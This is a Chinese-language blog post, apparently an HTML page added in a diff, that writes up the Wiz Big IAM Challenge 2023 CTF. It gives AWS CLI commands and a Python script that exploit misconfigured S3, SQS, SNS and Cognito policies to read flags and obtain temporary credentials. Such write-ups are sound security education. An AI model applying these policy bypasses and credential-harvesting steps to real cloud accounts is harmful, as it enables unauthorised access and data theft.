@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="趁這次來記錄一下 游 wiz 舉辦的 IAM CTF challengehttps://www.wiz.io/blog/the-big-iam-challenge
+Challenge 1View IAM Policy
+問題出在這個 Policy允許（&amp;quot;Effect&amp;quot;: &amp;quot;Allow&amp;quot;）任何主體（&amp;quot;Principal&amp;quot;: &amp;quot;*&amp;quot;）針對 thebigiamchallenge-storage-9979f4b （&amp;quot;Resource&amp;quot;: &amp;quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&amp;quot;）進行 GetObject 的行為（&amp;quot;Action&amp;quot;: &amp;quot;s3:GetObject&amp;quot;）
+並同時允許（&amp;quot;Effect&amp;quot;: &amp;quot;Allow&amp;quot;）任何主體（&amp;quot;Principal&amp;quot;: &amp;quot;*&amp;quot;）針對 thebigiamchallenge-storage-9979f4b （&amp;quot;Resource&amp;quot;: &amp;quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&amp;quot;）列出（&amp;quot;Action&amp;quot;: &amp;quot;s3:ListBucket&amp;quot;）以 files/ 為前綴的資源1234&amp;quot;Condition&amp;quot;: &amp;#123;               &amp;quot;StringLike&amp;quot;: &amp;#123;                   &amp;quot;s3:prefix&amp;quot;: &amp;quot;files/*&amp;quot;               &amp;#125;參考:AWS - S3, Athena &amp;amp; Glacier Enum - HackTricks Cloud">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="AStar">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="The Big IAM Challenge 2023"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="AStar&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+        <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>The Big IAM Challenge 2023 - AStar&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">AStar</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/">
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/archives">
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/tags">
+                            
+                                Tags
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories">
+                            
+                                Categories
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-clean-blog">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>The Big IAM Challenge 2023</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2023-07-15
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>趁這次來記錄一下 游 wiz 舉辦的 IAM CTF challenge<br><a target="_blank" rel="noopener" href="https://www.wiz.io/blog/the-big-iam-challenge">https://www.wiz.io/blog/the-big-iam-challenge</a></p>
+<h1 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h1><p><a target="_blank" rel="noopener" href="https://bigiamchallenge.com/challenge/1#ex1">View IAM Policy</a></p>
+<p><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230715234234.png" alt=""><br>問題出在這個 Policy<br>允許（<code>&quot;Effect&quot;: &quot;Allow&quot;</code>）<br>任何主體（<code>&quot;Principal&quot;: &quot;*&quot;</code>）<br>針對 thebigiamchallenge-storage-9979f4b （<code>&quot;Resource&quot;: &quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&quot;</code>）<br>進行 GetObject 的行為（<code>&quot;Action&quot;: &quot;s3:GetObject&quot;</code>）</p>
+<p>並同時允許（<code>&quot;Effect&quot;: &quot;Allow&quot;</code>）<br>任何主體（<code>&quot;Principal&quot;: &quot;*&quot;</code>）<br>針對 thebigiamchallenge-storage-9979f4b （<code>&quot;Resource&quot;: &quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&quot;</code>）<br>列出（<code>&quot;Action&quot;: &quot;s3:ListBucket&quot;</code>）<br>以 files/ 為前綴的資源<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;Condition&quot;: &#123;</span><br><span class="line">               &quot;StringLike&quot;: &#123;</span><br><span class="line">                   &quot;s3:prefix&quot;: &quot;files/*&quot;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure><br>參考:<br><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum">AWS - S3, Athena &amp; Glacier Enum - HackTricks Cloud</a></p>
+<p>解法:<br><code>aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/</code><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716000017.png" alt=""><br><code>aws s3 cp  s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp/</code><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716000533.png" alt=""><br>除了 ls 和 cp 以外還有其他參數供參考<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716023152.png" alt=""></p>
+<h1 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h1><p><a target="_blank" rel="noopener" href="https://bigiamchallenge.com/challenge/2#ex1">View IAM Policy</a><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716002254.png" alt=""><br>問題出在這個 Policy<br>允許（<code>&quot;Effect&quot;: &quot;Allow&quot;</code>）<br>任何主體（<code>&quot;Principal&quot;: &quot;*&quot;</code>）<br>針對 arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2（<code>&quot;Resource&quot;: &quot;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</code>）<br>執行 SendMessage 和 ReceiveMessage 的行為<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;Action&quot;: [</span><br><span class="line">               &quot;sqs:SendMessage&quot;,</span><br><span class="line">               &quot;sqs:ReceiveMessage&quot; </span><br><span class="line">           ],</span><br></pre></td></tr></table></figure></p>
+<p>參考:<br><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-sqs-post-exploitation">AWS - SQS Post Exploitation - HackTricks Cloud</a><br><a target="_blank" rel="noopener" href="https://github.com/aws/aws-sdk/issues/15">Get SQS Queue URL from ARN · Issue #15 · aws/aws-sdk (github.com)</a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># from this:  </span><br><span class="line"># arn:aws:sqs:eu-west-2:XXXXXXXXXXXX:sqs003  </span><br><span class="line"># to this:  </span><br><span class="line"># [https://sqs.eu-west-2.amazonaws.com/XXXXXXXXXXXX/TestInputQueue](https://sqs.eu-west-2.amazonaws.com/XXXXXXXXXXXX/TestInputQueue)</span><br></pre></td></tr></table></figure></p>
+<p>解法:<br><code>aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2</code><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716013450.png" alt=""></p>
+<h1 id="Challenge-3"><a href="#Challenge-3" class="headerlink" title="Challenge 3"></a>Challenge 3</h1><p><a target="_blank" rel="noopener" href="https://bigiamchallenge.com/challenge/3#ex1">View IAM Policy</a></p>
+<p><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716013558.png" alt=""><br>問題出在這個 Policy<br>允許（<code>&quot;Effect&quot;: &quot;Allow&quot;</code>）<br>任何 AWS 的主體（<code>&quot;Principal&quot;:&#123; AWS:&quot;*&quot;</code>}）<br>針對 arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications（<code>&quot;Resource&quot;: &quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</code>）<br>限制以 <code>@​tbic.wiz.io</code> 為結尾的 Endpoint 端 (過於鬆散)<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;Condition&quot;: &#123;</span><br><span class="line">    &quot;StringLike&quot;: &#123;</span><br><span class="line">        &quot;sns:Endpoint&quot;: &quot;*@tbic.wiz.io&quot;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>執行 Subscribe 的行為（<code>&quot;Action&quot;: &quot;SNS:Subscribe&quot;</code>）</p>
+<p>參考:<br><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-sns-post-exploitation">AWS - SNS Post Exploitation - HackTricks Cloud</a><br><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-sns-enum">AWS - SNS Enum - HackTricks Cloud</a><br><a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/zh_tw/cli/latest/userguide/cli-services-sns.html">搭配 AWS CLI 使用 Amazon SNS - AWS Command Line Interface</a><br><a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/sns/latest/dg/sns-create-subscribe-endpoint-to-topic.html">Subscribing to an Amazon SNS topic - Amazon Simple Notification Service</a></p>
+<p>解法:<br>首先用<br><code>aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint my-email@tbic.wiz.io</code> 嘗試<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716023819.png" alt=""><br>看起來有成功發信，但沒有那個信箱所以收不到信，嘗試其他 protocol<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716024037.png" alt=""></p>
+<p><code>aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol http --notification-endpoint http://[public ip]:8080/@tbic.wiz.io</code><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716024537.png" alt=""><br>在 server 聽特定的 port 就會看到訂閱確認的 Link 了<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716024829.png" alt=""><br>訪問 Link 過沒多久就收到 flag 了<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716025045.png" alt=""></p>
+<h1 id="Challenge-4"><a href="#Challenge-4" class="headerlink" title="Challenge 4"></a>Challenge 4</h1><p><a target="_blank" rel="noopener" href="https://bigiamchallenge.com/challenge/4#ex1">View IAM Policy</a><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716031951.png" alt=""></p>
+<p>相同的地方就不再贅述，跟第一題差異的地方是他的 ListBucket 行為限制了特定的 ARN 才能進行<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;Condition&quot;: &#123;</span><br><span class="line">      &quot;StringLike&quot;: &#123;</span><br><span class="line">          &quot;s3:prefix&quot;: &quot;files/*&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;ForAllValues:StringLike&quot;: &#123;</span><br><span class="line">          &quot;aws:PrincipalArn&quot;: &quot;arn:aws:iam::133713371337:user/admin&quot;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></p>
+<p>參考:<br><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum#enumeration">AWS - S3, Athena &amp; Glacier Enum - HackTricks Cloud</a></p>
+<p>解法:<br>前面嘗試做 enum，但都沒什麼結果<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716033620.png" alt=""><br>最後試 <code>--no-sign-request</code> 成功了，看來這個可以用來 bypass <code>PrincipalArn</code><br><code>aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request</code><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716033209.png" alt=""></p>
+<h1 id="Challenge-5"><a href="#Challenge-5" class="headerlink" title="Challenge 5"></a>Challenge 5</h1><p><a target="_blank" rel="noopener" href="https://bigiamchallenge.com/challenge/5#ex1">View IAM Policy</a><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716034251.png" alt=""></p>
+<p>參考:<br><a target="_blank" rel="noopener" href="https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963">Exploiting weak configurations in Amazon Cognito | by Pankaj Mouriya | Appsecco</a></p>
+<p>解法:<br>主要是多了 AWS Cognito 身分驗證的機制</p>
+<p>根據上面找到的作法來做，在 response body 找到 key 的資訊<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716043716.png" alt=""><br>原本想透過 aws 的 cli 做，但卡在 read-only，所以改到自己的主機上做<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716044014.png" alt=""><br>其實只要把對應的資訊填入 aws configure 檔案裡面就好（~/.aws/credentials）<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716052353.png" alt=""></p>
+<p><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716052616.png" alt=""></p>
+<h1 id="Challenge-6"><a href="#Challenge-6" class="headerlink" title="Challenge 6"></a>Challenge 6</h1><p><a target="_blank" rel="noopener" href="https://bigiamchallenge.com/challenge/6#ex1">View IAM Policy</a><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716055057.png" alt=""><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716055037.png" alt=""></p>
+<p>參考:<br><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-cognito-enum/cognito-identity-pools">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-cognito-enum/cognito-identity-pools</a><br><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-sts-privesc">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-sts-privesc</a></p>
+<p>解法:</p>
+<p>先說說最終目標，根據網站描述，要進行 <code>AssumeRoleWithWebIdentity</code> 必須要有 token<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716060755.png" alt=""><br>於是下面開始嘗試取得 token<br>首先根據上面的資料寫出 exploit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">region = <span class="string">&quot;us-east-1&quot;</span></span><br><span class="line">id_pool_id = <span class="string">&#x27;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;https://cognito-identity.<span class="subst">&#123;region&#125;</span>.amazonaws.com/&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;X-Amz-Target&quot;</span>: <span class="string">&quot;AWSCognitoIdentityService.GetId&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-amz-json-1.1&quot;</span>&#125;</span><br><span class="line">params = &#123;<span class="string">&#x27;IdentityPoolId&#x27;</span>: id_pool_id&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, json=params, headers=headers)</span><br><span class="line">json_resp = r.json()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="string">&quot;IdentityId&quot;</span> <span class="keyword">in</span> json_resp:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Not valid id: <span class="subst">&#123;id_pool_id&#125;</span>&quot;</span>)</span><br><span class="line">    exit</span><br><span class="line"></span><br><span class="line">IdentityId = r.json()[<span class="string">&quot;IdentityId&quot;</span>]</span><br><span class="line"></span><br><span class="line">params = &#123;<span class="string">&#x27;IdentityId&#x27;</span>: IdentityId&#125;</span><br><span class="line"></span><br><span class="line">headers[<span class="string">&quot;X-Amz-Target&quot;</span>] = <span class="string">&quot;AWSCognitoIdentityService.GetCredentialsForIdentity&quot;</span></span><br><span class="line">r = requests.post(url, json=params, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.json())</span><br></pre></td></tr></table></figure>
+<p>leak 出登入資訊<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716055231.png" alt=""><br>將 leak 出的資訊匯入  aws configure<br><code>aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b --profile test2</code><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716061233.png" alt=""><br><code>aws cognito-identity get-open-id-token --identity-id us-east-1:6e61a4c1-1bed-45f1-905d-86e71f158c28 --profile test2</code><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716061313.png" alt=""><br><code>aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name sessionname --web-identity-token eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6NmU2MWE0YzEtMWJlZC00NWYxLTkwNWQtODZlNzFmMTU4YzI4IiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE2ODk0NTg5MTEsImlhdCI6MTY4OTQ1ODMxMX0.P-EmLVvd58kavFESF1TruTPUDRXxEQ56Q1xNY_FT2rXt_mZAywjqqamBO5_EdaeZ59YVyoVuHfJhR8B58h14Dw8uvq30i77qKfxHID4LfsYUuwdrSTMJO7Tl6ZC-EjvhZS8kwd81_yFegZU6K75kvxn8nYQQc3qYjz0n6DZJCkaYpI7bapiWadcdpyRVD_Wdk3S9onmMLP1_HJwdMIpLmOYnoEkU5pGf1A6laxWZISOdJaprbYen_wnTbaSuZD98AL4EF9WJ-GrkoxboACjScQ48h24a-uYsYpbA5J21MiHipDBXu8YEa5MtScqY7KHP_ORkdJbPBlGApq74pj1XGg --profile test2</code><br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716061004.png" alt=""><br>一切照著 hacktrick 做，只是把 <code>--no-sign</code> 換成帶 credential 了<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716061048.png" alt=""><br>這樣就取得 IAM session creds 了，一樣帶入 aws configure<br><img src="/img/2023/The-Big-IAM-Challenge-2023/Pasted image 20230716061455.png" alt=""></p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/sda06407" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2023 AStar<br></p>
+                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
+                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
